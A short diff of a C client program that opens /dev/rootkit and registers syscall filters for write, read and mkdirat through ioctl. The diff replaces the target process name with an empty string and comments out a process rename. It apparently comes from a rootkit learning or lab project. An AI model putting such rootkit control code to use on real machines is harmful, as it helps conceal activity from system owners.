@@ -20,14 +20,14 @@ int main() {
     int fd = open("/dev/rootkit", O_RDWR);
     struct filter_info info;
     char pname[TASK_FILTER_LEN] = "yoman";
-    prctl(PR_SET_NAME, pname);
+    // prctl(PR_SET_NAME, pname);
 
     // 設定 process 名稱為 "test_process"
     // prctl(PR_SET_NAME, "test_process");
 
     // Add write filter
     info.syscall_nr = __NR_write;
-    strncpy(info.comm, pname, TASK_FILTER_LEN - 1);
+    strncpy(info.comm, "", TASK_FILTER_LEN - 1);
     info.comm[TASK_FILTER_LEN - 1] = '\0';
     if (ioctl(fd, IOCTL_ADD_FILTER, &info) < 0) {
         perror("ioctl");
@@ -36,13 +36,13 @@ int main() {
     }
     // Add read filter
     info.syscall_nr = __NR_read;
-    strncpy(info.comm, pname, TASK_FILTER_LEN - 1);
+    strncpy(info.comm, "", TASK_FILTER_LEN - 1);
     info.comm[TASK_FILTER_LEN - 1] = '\0';
     ioctl(fd, IOCTL_ADD_FILTER, &info);
 
     // Add mkdirat filter
     info.syscall_nr = __NR_mkdirat;
-    strncpy(info.comm, pname, TASK_FILTER_LEN - 1);
+    strncpy(info.comm, "", TASK_FILTER_LEN - 1);
     info.comm[TASK_FILTER_LEN - 1] = '\0';
     ioctl(fd, IOCTL_ADD_FILTER, &info);
 
